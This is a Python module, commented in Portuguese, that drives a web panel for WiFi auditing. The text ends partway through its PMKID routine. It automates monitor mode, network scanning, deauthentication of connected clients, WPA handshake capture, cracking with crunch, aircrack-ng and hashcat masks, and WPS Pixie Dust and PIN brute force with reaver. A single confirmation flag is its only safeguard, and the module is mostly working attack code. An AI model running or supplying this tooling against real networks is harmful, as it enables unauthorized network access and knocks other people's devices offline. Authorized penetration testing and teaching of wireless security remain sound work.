"""
core.py — motor da auditoria WiFi, usado pelo painel web (app.py).

É a mesma lógica do auditor.sh (CLI), portada para Python, pra ser mais
fácil de orquestrar com formulários/botões e log ao vivo na página.

Toda saída de log vai, ao mesmo tempo, para o arquivo auditoria_gui.log e
para a função de callback (log_cb) passada pro Engine — essa função é quem
manda a linha pro navegador em tempo real via Server-Sent Events.
"""

import csv
import io
import os
import re
import signal
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
from uuid import uuid4

WORKDIR = Path(__file__).resolve().parent.parent  # .../wifi-auditor/
LOGFILE = WORKDIR / "auditoria_gui.log"
RESPOSTAS = WORKDIR / "respostas.txt"
CAPTURE_PREFIX = WORKDIR / "captura_gui"
SCAN_PREFIX = WORKDIR / "scan_gui"
WORDLIST_DIR = WORKDIR / "wordlists"
ROCKYOU = WORDLIST_DIR / "rockyou.txt"
ROCKYOU_URL = (
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
)

DEPENDENCIAS_APT = [
    "aircrack-ng",
    "reaver",
    "pixiewps",
    "hashcat",
    "crunch",
    "hcxtools",
    "hcxdumptool",
    "tcpdump",
]


def _agora():
    return datetime.now().strftime("%H:%M:%S")


class AttackAborted(Exception):
    """Levantada quando o usuário pede parada de emergência pelo painel."""


class Engine:
    """
    Mantém todo o estado de uma sessão de auditoria (uma por vez — é uma
    ferramenta de uso pessoal/didático, não multiusuário) e os métodos que
    fazem cada etapa, espelhando as seções do auditor.sh.
    """

    def __init__(self, log_cb):
        self.log_cb = log_cb
        self.session_id = uuid4().hex[:12]
        self.iface = None
        self.moniface = None
        self.monitor_ativo = False
        self.rede_interrompida = False
        self.alvos = []          # lista de dicts do último scan
        self.target = {}         # alvo escolhido: essid/bssid/ch/enc/freq
        self.senha = None
        self._mask = None        # máscara da Rota A, reaproveitada pela Rota D (PMKID)
        self.rota_usada = None
        self.ip_roteador = None
        self.autorizado = False
        self.autorizado_bssid = None
        self._parar = False      # flag de parada de emergência (botão do painel)
        self._airodump_proc = None
        self._capture_path = None
        self._capture_bssid = None
        self.deauth_estado = "nao_solicitado"
        self._processos = set()
        self._processos_lock = threading.RLock()

    # ------------------------------------------------------------------
    # util
    # ------------------------------------------------------------------

    def log(self, msg):
        linha = f"[{_agora()}][sessão:{self.session_id}] {msg}"
        try:
            with open(LOGFILE, "a") as f:
                f.write(linha + "\n")
        except OSError:
            pass
        self.log_cb(linha)

    def pedir_parada(self):
        """Chamado pelo endpoint /api/stop (botão de emergência no painel)."""
        self._parar = True
        with self._processos_lock:
            processos = list(self._processos)
        for proc in processos:
            self._encerrar_processo(proc)

    def iniciar_operacao(self):
        """Limpa exclusivamente a solicitação de parada de uma operação anterior."""
        self._parar = False

    def _checar_parada(self):
        if self._parar:
            raise AttackAborted("Parada solicitada pelo usuário no painel.")

    def _registrar_processo(self, proc):
        with self._processos_lock:
            self._processos.add(proc)

    def _desregistrar_processo(self, proc):
        with self._processos_lock:
            self._processos.discard(proc)

    def _sleep_interruptivel(self, segundos):
        fim = time.monotonic() + segundos
        while time.monotonic() < fim:
            self._checar_parada()
            time.sleep(min(0.25, max(0, fim - time.monotonic())))

    def run(self, cmd, timeout=None, input_text=None, cancelavel=True, ocultar=()):
        """Executa e supervisiona um subprocesso.

        Processos canceláveis são registrados para que o botão de parada os
        encerre antes de restaurar a interface. ``ocultar`` redige segredos do
        comando no log, sem alterar os argumentos efetivamente executados.
        """
        if cancelavel:
            self._checar_parada()
        exibicao = " ".join(str(c) for c in cmd)
        for segredo in ocultar:
            if segredo:
                exibicao = exibicao.replace(str(segredo), "<redigido>")
        self.log("$ " + exibicao)
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE if input_text is not None else None,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            start_new_session=True,
        )
        self._registrar_processo(proc)
        inicio = time.monotonic()
        entrada = input_text
        try:
            while True:
                if cancelavel and self._parar:
                    self._encerrar_processo(proc)
                    raise AttackAborted("Parada solicitada pelo usuário no painel.")
                if timeout is not None and time.monotonic() - inicio >= timeout:
                    self._encerrar_processo(proc)
                    out, err = proc.communicate()
                    self.log(f"(comando interrompido após {timeout}s)")
                    return subprocess.CompletedProcess(cmd, 124, out or "", err or "")
                try:
                    out, err = proc.communicate(input=entrada, timeout=0.25)
                    break
                except subprocess.TimeoutExpired:
                    entrada = None
        finally:
            self._desregistrar_processo(proc)

        if cancelavel and self._parar:
            raise AttackAborted("Parada solicitada pelo usuário no painel.")

        for stream in (out, err):
            if stream:
                try:
                    with open(LOGFILE, "a") as f:
                        f.write(stream)
                except OSError:
                    pass
        return subprocess.CompletedProcess(cmd, proc.returncode, out or "", err or "")

    def _run_pipeline(self, produtor_cmd, consumidor_cmd, timeout=None):
        """Executa produtor | consumidor mantendo ambos canceláveis."""
        self.log(
            "$ " + " ".join(map(str, produtor_cmd)) + " | "
            + " ".join(map(str, consumidor_cmd))
        )
        produtor = subprocess.Popen(
            produtor_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            start_new_session=True,
        )
        consumidor = subprocess.Popen(
            consumidor_cmd,
            stdin=produtor.stdout,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            start_new_session=True,
        )
        produtor.stdout.close()
        self._registrar_processo(produtor)
        self._registrar_processo(consumidor)
        inicio = time.monotonic()
        try:
            while True:
                self._checar_parada()
                if timeout is not None and time.monotonic() - inicio >= timeout:
                    self._encerrar_processo(consumidor)
                    self._encerrar_processo(produtor)
                    return subprocess.CompletedProcess(consumidor_cmd, 124, "", "timeout")
                try:
                    out, err = consumidor.communicate(timeout=0.25)
                    break
                except subprocess.TimeoutExpired:
                    continue
            self._encerrar_processo(produtor)
            produtor_err = produtor.stderr.read().decode(errors="replace")
            if produtor_err:
                with open(LOGFILE, "a") as f:
                    f.write(produtor_err)
            if err:
                with open(LOGFILE, "a") as f:
                    f.write(err)
            return subprocess.CompletedProcess(
                consumidor_cmd, consumidor.returncode, out or "", err or ""
            )
        finally:
            self._encerrar_processo(consumidor)
            self._encerrar_processo(produtor)
            self._desregistrar_processo(consumidor)
            self._desregistrar_processo(produtor)

    # ------------------------------------------------------------------
    # 1. dependências / wordlist
    # ------------------------------------------------------------------

    def verificar_dependencias(self):
        self.log("Verificando dependências...")
        faltando = []
        for pacote in DEPENDENCIAS_APT:
            r = subprocess.run(["dpkg", "-s", pacote], capture_output=True)
            if r.returncode != 0:
                faltando.append(pacote)

        if faltando:
            self.log(f"Pacotes faltando: {', '.join(faltando)}. Instalando...")
            self.run(["apt-get", "update"], timeout=300)
            r = self.run(["apt-get", "install", "-y", *faltando], timeout=600)
            if r.returncode != 0:
                raise RuntimeError("Falha ao instalar dependências. Veja o log.")
        else:
            self.log("Todas as dependências já instaladas.")

    def garantir_wordlist(self):
        WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
        if ROCKYOU.exists() and ROCKYOU.stat().st_size > 0:
            self.log(f"rockyou.txt já existe em {ROCKYOU}.")
            return

        for candidato in (
            Path("/usr/share/wordlists/rockyou.txt"),
            Path("/usr/share/wordlists/rockyou.txt.gz"),
        ):
            if candidato.exists() and candidato.stat().st_size > 0:
                self.log(f"Encontrada wordlist do sistema em {candidato}.")
                if candidato.suffix == ".gz":
                    self.run(["bash", "-c", f"gunzip -c '{candidato}' > '{ROCKYOU}'"])
                else:
                    self.run(["cp", str(candidato), str(ROCKYOU)])
                return

        self.log("rockyou.txt não encontrada. Baixando agora (ainda com internet ativa)...")
        tmp = ROCKYOU.with_suffix(".tmp")
        r = self.run(["curl", "-fL", "-o", str(tmp), ROCKYOU_URL], timeout=600)
        if r.returncode == 0 and tmp.exists() and tmp.stat().st_size > 0:
            tmp.rename(ROCKYOU)
            self.log(f"Wordlist baixada com sucesso: {ROCKYOU}")
        else:
            self.log("AVISO: falha ao baixar rockyou.txt. A rota de dicionário pode falhar depois.")
            if tmp.exists():
                tmp.unlink()

    # ------------------------------------------------------------------
    # 2. interface / modo monitor
    # ------------------------------------------------------------------

    def _listar_interfaces(self):
        r = self.run(["iw", "dev"], timeout=10)
        return re.findall(r"Interface\s+(\S+)", r.stdout)

    def detectar_interfaces(self):
        interfaces = self._listar_interfaces()
        if not interfaces:
            raise RuntimeError("Nenhuma interface WiFi encontrada (iw dev não listou nada).")
        return interfaces

    def entrar_modo_monitor(self, iface):
        if not iface or iface not in self._listar_interfaces():
            raise RuntimeError("Interface WiFi inválida ou indisponível.")
        self.iface = iface
        self.rede_interrompida = True
        self.log("Ajustando região regulatória para BR...")
        self.run(["iw", "reg", "set", "BR"], timeout=10)

        self.log("Matando processos que podem interferir (NetworkManager, wpa_supplicant)...")
        r = self.run(["airmon-ng", "check", "kill"], timeout=20)
        if r.returncode == 124:
            self.log("Aviso: 'airmon-ng check kill' não respondeu em 20s, seguindo assim mesmo.")

        # Snapshot ANTES de ativar o modo monitor: assim identificamos a
        # interface pelo que mudou (apareceu/desapareceu), não pelo nome
        # conter "mon" — uma interface monitor de uma execução anterior que
        # travou (e não foi limpa) também bate nesse critério e fazia o
        # código pegar a interface errada (silenciosamente), gerando captura
        # vazia / parecendo travado mais adiante, sem erro nenhum aqui.
        antes = set(self._listar_interfaces())

        self.log(f"Ativando modo monitor em {iface}...")
        r = self.run(["airmon-ng", "start", iface], timeout=20)
        if r.returncode == 124:
            raise RuntimeError(
                "'airmon-ng start' travou por mais de 20s. A placa pode estar presa em "
                "modo monitor de uma execução anterior — use o botão 'Restaurar minha rede' "
                "e tente de novo."
            )
        time.sleep(2)

        depois = set(self._listar_interfaces())
        novas = sorted(depois - antes)
        candidatos = [i for i in novas if "mon" in i.lower()]
        if candidatos:
            self.moniface = candidatos[0]
        elif iface in depois:
            # algumas versões não renomeiam a interface, só trocam o tipo
            info = self.run(["iw", "dev", iface, "info"], timeout=10)
            if "type monitor" in info.stdout.lower():
                self.moniface = iface
            else:
                raise RuntimeError("Não foi possível identificar a interface em modo monitor.")
        else:
            raise RuntimeError(
                f"A interface {iface} desapareceu e nenhuma interface monitor nova surgiu. "
                "Use o botão 'Restaurar minha rede' e tente de novo."
            )

        self.monitor_ativo = True
        self.log(f"Interface em modo monitor: {self.moniface}")
        return self.moniface

    def garantir_moniface_viva(self):
        if not self.moniface or not self.iface:
            raise RuntimeError("Modo monitor ainda não foi preparado.")
        r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
        if r.returncode != 0:
            self.log(f"Interface {self.moniface} sumiu. Recriando modo monitor...")
            self.entrar_modo_monitor(self.iface)

    def restaurar_modo_gerenciado(self, forcar=False):
        if not self.monitor_ativo and not self.rede_interrompida and not forcar:
            self.log("Interface já está em modo gerenciado; restauração dispensada.")
            return
        if self.moniface:
            r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
            if r.returncode == 0:
                self.log(f"Parando modo monitor em {self.moniface}...")
                self.run(["airmon-ng", "stop", self.moniface], timeout=15, cancelavel=False)
        self.log("Religando NetworkManager...")
        r = self.run(
            ["systemctl", "restart", "NetworkManager"], timeout=15, cancelavel=False
        )
        if r.returncode != 0:
            self.run(
                ["service", "network-manager", "restart"], timeout=15, cancelavel=False
            )
        time.sleep(2)
        self.monitor_ativo = False
        self.rede_interrompida = False
        self.moniface = None

    # ------------------------------------------------------------------
    # 3. scan e escolha do alvo
    # ------------------------------------------------------------------

    @staticmethod
    def _parsear_scan_csv(texto):
        secao_aps = texto.split("Station MAC", 1)[0]
        linhas = list(csv.reader(io.StringIO(secao_aps)))
        aps = []
        rejeitadas = 0
        for campos in linhas:
            if not campos or not campos[0].strip():
                continue
            bssid = campos[0].strip()
            if len(campos) < 14 or not re.fullmatch(
                r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}", bssid
            ):
                # Cabeçalhos não contam como AP rejeitado.
                if bssid.lower() != "bssid":
                    rejeitadas += 1
                continue
            ch = campos[3].strip()
            privacidade = campos[5].strip()
            power = campos[8].strip() or "-100"
            essid = campos[-2].strip() or "<oculto>"
            aps.append({
                "bssid": bssid,
                "ch": ch,
                "enc": privacidade,
                "pwr": int(power) if power.lstrip("-").isdigit() else -100,
                "essid": essid,
            })
        aps.sort(key=lambda a: a["pwr"], reverse=True)
        return aps, rejeitadas

    @staticmethod
    def _arquivo_mais_recente(padrao):
        arquivos = [
            p for p in WORKDIR.glob(padrao)
            if p.is_file() and not p.name.endswith((".kismet.csv", ".log.csv"))
        ]
        return max(arquivos, key=os.path.getmtime) if arquivos else None

    def escanear(self, duracao=15):
        self.session_id = uuid4().hex[:12]
        # Um novo scan inicia um novo contexto de seleção. Resultados e
        # autorização do alvo anterior não podem atravessar essa fronteira.
        self.target = {}
        self.autorizado = False
        self.autorizado_bssid = None
        self.senha = None
        self.rota_usada = None
        self.ip_roteador = None
        self._mask = None
        self._capture_path = None
        self._capture_bssid = None
        self.deauth_estado = "nao_solicitado"
        self.garantir_moniface_viva()
        scan_id = uuid4().hex[:8]
        self.log(
            f"scan_id={scan_id} início; fonte=airodump-ng; interface={self.moniface}; "
            f"bandas=abg; duração={duracao}s"
        )

        for p in WORKDIR.glob(SCAN_PREFIX.name + "*"):
            p.unlink(missing_ok=True)

        erro_scan = WORKDIR / "scan_gui.stderr.log"
        erro_scan.unlink(missing_ok=True)
        with open(erro_scan, "w") as stderr:
            proc = subprocess.Popen(
                [
                    "airodump-ng", "--band", "abg", "--write-interval", "1",
                    "--write", str(SCAN_PREFIX), "--output-format", "csv",
                    self.moniface,
                ],
                stdout=subprocess.DEVNULL,
                stderr=stderr,
                start_new_session=True,
            )
            self._registrar_processo(proc)
            inicio = time.monotonic()
            terminou_antes = False
            try:
                while time.monotonic() - inicio < duracao:
                    self._checar_parada()
                    if proc.poll() is not None:
                        terminou_antes = True
                        break
                    time.sleep(0.25)
            finally:
                self._encerrar_processo(proc)
                self._desregistrar_processo(proc)

        if terminou_antes and proc.returncode not in (0, -signal.SIGTERM):
            detalhe = erro_scan.read_text(errors="replace")[-1000:]
            raise RuntimeError(
                f"O processo de scan terminou antes do prazo (rc={proc.returncode}). {detalhe}"
            )

        csv_path = self._arquivo_mais_recente(f"{SCAN_PREFIX.name}-[0-9]*.csv")
        if not csv_path:
            detalhe = erro_scan.read_text(errors="replace")[-1000:]
            raise RuntimeError(f"Arquivo de scan não foi gerado. {detalhe}")

        texto = csv_path.read_text(errors="replace")
        aps, rejeitadas = self._parsear_scan_csv(texto)
        if not aps:
            raise RuntimeError(
                f"Nenhum AP válido encontrado; linhas rejeitadas={rejeitadas}; arquivo={csv_path.name}."
            )
        self.alvos = aps
        self.log(
            f"scan_id={scan_id} fim; arquivo={csv_path.name}; "
            f"aceitas={len(aps)}; rejeitadas={rejeitadas}"
        )
        return aps

    def escolher_alvo(self, idx):
        if not isinstance(idx, int) or idx < 0 or idx >= len(self.alvos):
            raise ValueError("Índice de alvo inválido.")
        alvo = self.alvos[idx]
        ch = int(alvo["ch"]) if alvo["ch"].isdigit() else 0
        freq_label = "5 GHz" if ch >= 36 else "2.4 GHz"
        self.target = {
            "essid": alvo["essid"], "bssid": alvo["bssid"],
            "ch": alvo["ch"], "enc": alvo["enc"], "freq_label": freq_label,
        }
        # A autorização pertence ao BSSID, não à instância permanente do Engine.
        self.autorizado = False
        self.autorizado_bssid = None
        self.senha = None
        self.rota_usada = None
        self.ip_roteador = None
        self._mask = None
        self._capture_path = None
        self._capture_bssid = None
        self.deauth_estado = "nao_solicitado"
        self.log(
            f"Alvo escolhido: ESSID={self.target['essid']} BSSID={self.target['bssid']} "
            f"CH={self.target['ch']} ENC={self.target['enc']} ({freq_label})"
        )
        return self.target

    def autorizar(self, confirmado):
        if not self.target.get("bssid"):
            raise RuntimeError("Selecione um alvo antes de autorizar.")
        self.autorizado = confirmado is True
        self.autorizado_bssid = self.target["bssid"] if self.autorizado else None
        if self.autorizado:
            self.log(f"Autorização confirmada pelo usuário para o alvo {self.target.get('bssid')}.")
        else:
            self.log("Autorização NÃO confirmada.")
        return self.autorizado

    def autorizacao_valida(self):
        return bool(
            self.autorizado
            and self.autorizado_bssid
            and self.autorizado_bssid == self.target.get("bssid")
        )

    def iniciar_tentativa(self):
        """Inicia uma tentativa limpa para o alvo já autorizado.

        Isto é necessário mesmo quando o BSSID não mudou: uma senha ou
        handshake da execução anterior não pode ser reaproveitado depois de o
        AP ter sua credencial alterada entre duas solicitações do professor.
        """
        if not self.autorizacao_valida():
            raise RuntimeError("A autorização não corresponde ao BSSID selecionado.")
        self.session_id = uuid4().hex[:12]
        self.senha = None
        self.rota_usada = None
        self.ip_roteador = None
        self._mask = None
        self._capture_path = None
        self._capture_bssid = None
        self.deauth_estado = "nao_solicitado"
        self.log(f"Nova tentativa iniciada para o BSSID {self.target['bssid']}.")

    # ------------------------------------------------------------------
    # 4. detecção de cliente conectado
    # ------------------------------------------------------------------

    def _ultimo_csv_captura(self):
        arquivos = [
            p for p in WORKDIR.glob(f"{CAPTURE_PREFIX.name}-[0-9]*.csv")
            if not p.name.endswith((".kismet.csv", ".log.csv"))
        ]
        return max(arquivos, key=os.path.getmtime) if arquivos else None

    def ha_cliente_conectado(self, max_idade=20):
        csv_path = self._ultimo_csv_captura()
        if not csv_path:
            return False
        texto = csv_path.read_text(errors="replace")
        if "Station MAC" not in texto:
            return False
        secao = texto.split("Station MAC", 1)[1]
        alvo = self.target.get("bssid", "").lower()
        for campos in csv.reader(io.StringIO(secao)):
            if len(campos) < 6 or campos[5].strip().lower() != alvo:
                continue
            visto = campos[2].strip()
            try:
                idade = (datetime.now() - datetime.strptime(visto, "%Y-%m-%d %H:%M:%S")).total_seconds()
            except ValueError:
                continue
            if -2 <= idade <= max_idade:
                return True
        return False

    def _ultimo_cap(self):
        caps = sorted(WORKDIR.glob(f"{CAPTURE_PREFIX.name}*.cap"), key=os.path.getmtime, reverse=True)
        return caps[0] if caps else None

    def _tem_handshake(self, capfile):
        if not capfile or not Path(capfile).exists() or not self.target.get("bssid"):
            return False
        r = self.run(
            ["aircrack-ng", "-b", self.target["bssid"], str(capfile)], timeout=20
        )
        saida = ((r.stdout or "") + (r.stderr or "")).lower()
        return bool(re.search(r"\b[1-9]\d* handshakes?\b", saida))

    # ------------------------------------------------------------------
    # 5. captura de handshake (unificada: já conectado OU vai conectar agora)
    # ------------------------------------------------------------------

    def capturar_handshake(self, max_tentativas=12, intervalo=10):
        self.garantir_moniface_viva()
        if (
            self._capture_path
            and self._capture_bssid == self.target.get("bssid")
            and self._tem_handshake(self._capture_path)
        ):
            self.log(f"Reutilizando handshake já validado: {Path(self._capture_path).name}.")
            return True
        self.log(f"Iniciando captura de handshake em {self.target['bssid']} (canal {self.target['ch']})...")

        for p in WORKDIR.glob(f"{CAPTURE_PREFIX.name}*"):
            p.unlink(missing_ok=True)

        captura_err = WORKDIR / "captura_gui_airodump.stderr.log"
        captura_err.unlink(missing_ok=True)
        handshake_ok = False
        with open(captura_err, "w") as stderr:
            proc = subprocess.Popen(
                ["airodump-ng", "--bssid", self.target["bssid"], "-c", str(self.target["ch"]),
                 "--write-interval", "1", "--write", str(CAPTURE_PREFIX), self.moniface],
                stdout=subprocess.DEVNULL, stderr=stderr, start_new_session=True,
            )
            self._airodump_proc = proc
            self._registrar_processo(proc)
            try:
                for tentativa in range(1, max_tentativas + 1):
                    self._sleep_interruptivel(intervalo)
                    if proc.poll() is not None:
                        detalhe = captura_err.read_text(errors="replace")[-1000:]
                        raise RuntimeError(
                            f"Captura terminou inesperadamente (rc={proc.returncode}). {detalhe}"
                        )

                    cap_atual = self._ultimo_cap()
                    if self._tem_handshake(cap_atual):
                        handshake_ok = True
                        self._capture_path = cap_atual
                        self._capture_bssid = self.target["bssid"]
                        break

                    if self.ha_cliente_conectado():
                        self.log(f"Tentativa {tentativa}: cliente associado recentemente detectado.")
                        self._executar_deauth_diagnostico()
                    else:
                        self.log(f"Tentativa {tentativa}: nenhum cliente recente detectado; aguardando conexão.")
            finally:
                self._encerrar_processo(proc)
                self._desregistrar_processo(proc)
                self._airodump_proc = None

        if not handshake_ok:
            cap_atual = self._ultimo_cap()
            if self._tem_handshake(cap_atual):
                handshake_ok = True
                self._capture_path = cap_atual
                self._capture_bssid = self.target["bssid"]

        if handshake_ok:
            self.log("Handshake capturado com sucesso.")
        else:
            self.log("Não foi possível capturar o handshake.")
        return handshake_ok

    def _executar_deauth_diagnostico(self):
        """Executa a tentativa já existente e registra somente seu estado real.

        Retorno zero significa apenas que o comando terminou; a confirmação do
        efeito continua sendo a recepção e validação posterior do handshake.
        """
        self.deauth_estado = "executando"
        r = self.run(
            ["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"], self.moniface],
            timeout=20,
        )
        if r.returncode == 0:
            self.deauth_estado = "comando_concluido"
            self.log("Deauthentication: comando concluído; efeito ainda não confirmado.")
        else:
            self.deauth_estado = "falhou"
            self.log(f"Deauthentication: comando falhou (rc={r.returncode}).")
        return r.returncode == 0

    def _encerrar_processo(self, proc):
        """Termina um processo em background com prazo (TERM -> espera -> KILL),
        igual ao auditor.sh — evita travar pra sempre esperando o processo morrer."""
        if not proc or proc.poll() is not None:
            return
        try:
            os.killpg(proc.pid, signal.SIGTERM)
        except (ProcessLookupError, PermissionError):
            proc.terminate()
        for _ in range(5):
            if proc.poll() is not None:
                return
            time.sleep(1)
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError):
            proc.kill()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            pass

    # ------------------------------------------------------------------
    # 6. rotas de ataque
    # ------------------------------------------------------------------

    def rota_mascara(self, tamanho=None, prefixo="", tipo_placeholder="", mascara=None):
        self.log("--- Rota A: ataque de máscara ---")
        if mascara:
            # Máscara crunch completa: parte conhecida em qualquer posição.
            # Tamanho = nº de posições de saída (\X escapado conta como 1).
            tamanho = len(mascara.replace("\\", ""))
        else:
            if tamanho is None:
                self.log("Faltam parâmetros da máscara. Abortando rota de máscara.")
                return False
            restante = tamanho - len(prefixo)
            if restante < 0:
                self.log("Prefixo maior que o tamanho total. Abortando rota de máscara.")
                return False
            mascara = prefixo + (tipo_placeholder * restante)

        if tamanho < 8:
            self.log(f"Aviso: WPA/WPA2 exige 8+ caracteres — máscara de {tamanho} dificilmente casa.")

        if not self.capturar_handshake():
            return False

        cap = self._ultimo_cap()
        self.log(f"Rodando crunch + aircrack-ng com máscara '{mascara}'...")
        aircrack = self._run_pipeline(
            ["crunch", str(tamanho), str(tamanho), "-t", mascara],
            ["aircrack-ng", "-w", "-", "-b", self.target["bssid"], str(cap)],
            timeout=3600,
        )

        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", aircrack.stdout)
        if m:
            self.senha = m.group(1)
            self.rota_usada = "Máscara (crunch)"
            self.log("Senha encontrada via máscara (valor redigido do log).")
            return True

        self.log("Máscara não encontrou a senha com os parâmetros informados.")
        return False

    def rota_mascara_hashcat(self, mascara, custom=""):
        """Variante da Rota A com coringas do hashcat (-a 3): ?l ?u ?d ?s e
        ?a = QUALQUER caractere imprimível — para posições cuja classe o
        usuário não sabe (o crunch não tem coringa 'qualquer'). Usa GPU; cai
        para CPU com --force se nenhum dispositivo for detectado."""
        self.log("--- Rota A (hashcat -a 3): máscara com coringas do hashcat ---")
        if not mascara:
            self.log("Máscara vazia. Abortando.")
            return False
        if not self.capturar_handshake():
            return False

        cap = self._ultimo_cap()
        if not _tool_existe("hcxpcapngtool"):
            self.log("hcxpcapngtool não encontrado — não dá pra converter a captura pro hashcat.")
            return False

        hashfile = WORKDIR / "hash_mask_gui.hc22000"
        hashfile.unlink(missing_ok=True)
        self.run(["hcxpcapngtool", "-o", str(hashfile), str(cap)])
        if not hashfile.exists() or hashfile.stat().st_size == 0:
            self.log("Não foi possível extrair hash da captura (handshake pode estar incompleto).")
            return False

        found = WORKDIR / "hashcat_mask_found_gui.txt"
        found.unlink(missing_ok=True)

        def _cmd(forcar):
            c = ["hashcat", "-m", "22000", str(hashfile), "-a", "3"]
            if custom:
                c += ["-1", custom]
            if forcar:
                c += ["--force"]
            c += [mascara, "--potfile-disable", "-o", str(found)]
            return c

        self.log(f"Rodando hashcat -a 3 com máscara '{mascara}' (pode demorar conforme o espaço de busca)...")
        r = self.run(_cmd(False), timeout=3600)
        saida = (r.stdout or "") + (r.stderr or "")
        if (not found.exists() or found.stat().st_size == 0) and re.search(
            r"no devices? (found|left)", saida, re.I
        ):
            self.log("Nenhum dispositivo detectado — repetindo com --force (CPU, mais lento)...")
            self.run(_cmd(True), timeout=3600)

        if found.exists() and found.stat().st_size > 0:
            linhas = found.read_text().strip().splitlines()
            if linhas:
                self.senha = linhas[-1].split(":", 1)[-1]
                self.rota_usada = "Máscara (hashcat -a 3)"
                self.log("Senha encontrada via máscara hashcat (valor redigido do log).")
                return True

        self.log("Máscara hashcat não encontrou a senha com os parâmetros informados.")
        return False

    def rota_wps(self):
        self.log("--- Rota B: WPS ---")
        self.garantir_moniface_viva()

        banda_flag = ["-5"] if self.target.get("freq_label") == "5 GHz" else []
        r = self.run(["timeout", "15", "wash", "-i", self.moniface, *banda_flag])
        if self.target["bssid"].lower() not in r.stdout.lower():
            self.log("AP não aparece com WPS ativo. Pulando rota WPS.")
            return False
        self.log("AP com WPS ativo. Tentando Pixie Dust...")

        log_path = WORKDIR / "reaver_pixie_gui.log"
        chegou_m1 = False
        inicio = time.time()
        with open(log_path, "w") as reaver_saida:
            proc = subprocess.Popen(
                ["timeout", "90", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
                 "-c", str(self.target["ch"]), "-K", "1", "-vv"],
                stdout=reaver_saida, stderr=subprocess.STDOUT, start_new_session=True,
            )
            self._registrar_processo(proc)
            try:
                while proc.poll() is None:
                    self._sleep_interruptivel(1)
                    texto = log_path.read_text(errors="replace")
                    if "received m1 message" in texto.lower():
                        chegou_m1 = True
                    if "wps pin:" in texto.lower() or "pin cracked" in texto.lower():
                        break
                    if not chegou_m1 and time.time() - inicio >= 90:
                        self.log("Loop de falha detectado sem receber M1 em 90s. Abortando rota WPS.")
                        break
            finally:
                self._encerrar_processo(proc)
                self._desregistrar_processo(proc)

        texto = log_path.read_text(errors="replace")
        m = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto)
        if "wps pin:" in texto.lower() and m:
            self.senha = m.group(1).strip()
            self.rota_usada = "WPS (Pixie Dust)"
            self.log("Senha encontrada via Pixie Dust (valor redigido do log).")
            return True

        if chegou_m1:
            self.log("Pixie Dust falhou mas AP respondeu. Tentando brute de PIN (mais lento)...")
            # self.run() captura a saída e a retorna — parsear o stdout/stderr
            # do próprio comando (o arquivo reaver_pin_gui.log nunca era escrito).
            r = self.run(
                ["timeout", "300", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
                 "-c", str(self.target["ch"]), "-vv", "-d", "15"],
            )
            texto2 = (r.stdout or "") + (r.stderr or "")
            m2 = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto2)
            if m2:
                self.senha = m2.group(1).strip()
                self.rota_usada = "WPS (brute PIN)"
                self.log("Senha encontrada via brute de PIN (valor redigido do log).")
                return True

        self.log("Rota WPS não teve sucesso.")
        return False

    def _crack_hc22000_com_mascara(self, hashfile, mask):
        """Quebra um .hc22000 usando a máscara da Rota A (dict). Retorna a
        senha ou None. Usada pela Rota D (PMKID) para quebrar sem handshake.
        Usa GPU; repete com --force se nenhum dispositivo for detectado."""
        if not mask or not _tool_existe("hashcat"):
            return None
        found = WORKDIR / "pmkid_mask_found_gui.txt"
        found.unlink(missing_ok=True)

        if mask.get("hashcat"):
            def _rodar(forcar):
                base = ["hashcat", "-m", "22000", str(hashfile), "-a", "3"]
                if mask.get("custom"):
                    base += ["-1", mask["custom"]]
                if forcar:
                    base += ["--force"]
                base += [mask["hashcat"], "--potfile-disable", "-o", str(found)]
                return self.run(base, timeout=3600)

            r = _rodar(False)
            saida = (r.stdout or "") + (r.stderr or "")
            if (not found.exists() or found.stat().st_size == 0) and re.search(
                r"no devices? (found|left)", saida, re.I
            ):
                _rodar(True)
        else:
            # crunch: máscara completa {mascara} ou guiada {tamanho,prefixo,tipo}
            if mask.get("mascara"):
                m = mask["mascara"]
                tam = len(m.replace("\\", ""))
            else:
                tam = mask.get("tamanho")
                if tam is None:
                    return None
                restante = tam - len(mask.get("prefixo", ""))
                if restante < 0:
                    return None
                m = mask.get("prefixo", "") + mask.get("tipo", "") * restante

            def _rodar_crunch(forcar):
                base = ["hashcat", "-m", "22000", str(hashfile)]
                if forcar:
                    base += ["--force"]
                base += ["--potfile-disable", "-o", str(found)]
                return self._run_pipeline(
                    ["crunch", str(tam), str(tam), "-t", m],
                    base,
                    timeout=3600,
                )

            r = _rodar_crunch(False)
            saida = (r.stdout or "") + (r.stderr or "")
            if (not found.exists() or found.stat().st_size == 0) and re.search(
                r"no devices? (found|left)", saida, re.I
            ):
                _rodar_crunch(True)

        if found.exists() and found.stat().st_size > 0:
            linhas = found.read_text().strip().splitlines()
            if linhas:
                return linhas[-1].split(":", 1)[-1]
        return None

    def rota_pmkid(self):
        self.log("--- Rota D: PMKID (ataque direto ao roteador, sem precisar de cliente) ---")
        self.garantir_moniface_viva()

        if not _tool_existe("hcxdumptool"):
            self.log("hcxdumptool não está instalado — pulando rota PMKID.")
            return False

        pmkid_cap = WORKDIR / "pmkid_gui.pcapng"
        pmkid_hash = WORKDIR / "pmkid_gui.hc22000"
        bpf_file = WORKDIR / "pmkid_gui_attack.bpf"
        for p in (pmkid_cap, pmkid_hash, bpf_file):
            p.unlink(missing_ok=True)

        bssid = self.target["bssid"]
